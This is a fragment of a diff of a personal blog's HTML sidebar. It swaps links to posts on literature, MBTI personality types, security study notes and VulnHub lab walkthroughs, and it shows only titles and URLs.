-    <span><a href="/2023/06/30/BOOK/25%E3%80%8A%E5%8D%81%E6%97%A5%E8%B0%88%E3%80%8B%E8%96%84%E4%BC%BD%E4%B8%98/" title="《十日谈》薄伽丘">《十日谈》薄伽丘</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2023/06/30/BOOK/66%E3%80%8A%E9%99%86%E7%8A%AF%E7%84%89%E8%AF%86%E3%80%8B%E4%B8%A5%E6%AD%8C%E5%B2%91/" title="《陆犯焉识》严歌岑">《陆犯焉识》严歌岑</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2023/07/01/VULNHUB/139%20INFERNO/" title="VULNHUB INFERNO">VULNHUB INFERNO</a></span>
+    <span><a href="/2023/07/04/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" title="XD22 13 补充知识">XD22 13 补充知识</a></span>
   </li>
 
       
@@ -920,17 +597,47 @@ Servlet-api 类（Servlet 型、Filter 型、Listener 型）<br>
 <a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
 </div>
 
-    <span><a href="/2023/04/01/MBTI/%E9%83%A8%E5%88%86%E5%AD%97%E6%AF%8D%E7%89%B9%E5%BE%81/" title="部分字母特征">部分字母特征</a></span>
+    <span><a href="/2023/04/01/MBTI/%E7%90%86%E6%83%B3%E5%8F%A6%E4%B8%80%E5%8D%8A/" title="理想另一半">理想另一半</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2023/06/30/BOOK/47%E3%80%8A%E4%BA%BA%E7%94%9F%E7%9A%84%E4%BB%B7%E5%80%BC%E4%B8%8E%E6%84%8F%E4%B9%89%E3%80%8B%E5%A5%A5%E4%BC%8A%E8%82%AF/" title="《人生的价值与意义》奥伊肯">《人生的价值与意义》奥伊肯</a></span>
+    <span><a href="/2023/06/30/BOOK/5%E3%80%8A%E4%B8%80%E4%B8%AA%E5%AD%A4%E7%8B%AC%E6%BC%AB%E6%AD%A5%E8%80%85%E7%9A%84%E9%81%90%E6%83%B3%E3%80%8B%E8%AE%A9%C2%B7%E9%9B%85%E5%85%8B%C2%B7%E5%8D%A2%E6%A2%AD/" title="《一个孤独漫步者的遐想》让·雅克·卢梭">《一个孤独漫步者的遐想》让·雅克·卢梭</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/INTP%E8%A7%A3%E8%AF%BB/" title="INTP解读">INTP解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/15%E3%80%8A%E5%9C%A3%E7%BB%8F%E6%98%AF%E6%80%8E%E6%A0%B7%E5%86%99%E6%88%90%E7%9A%84%E3%80%8B%E5%BA%B7%E8%AF%BA%E5%88%A9/" title="《圣经是怎样写成的》康诺利">《圣经是怎样写成的》康诺利</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/129%20PRESIDENTIAL/" title="VULNHUB PRESIDENTIAL">VULNHUB PRESIDENTIAL</a></span>
   </li>
 
   </ul>
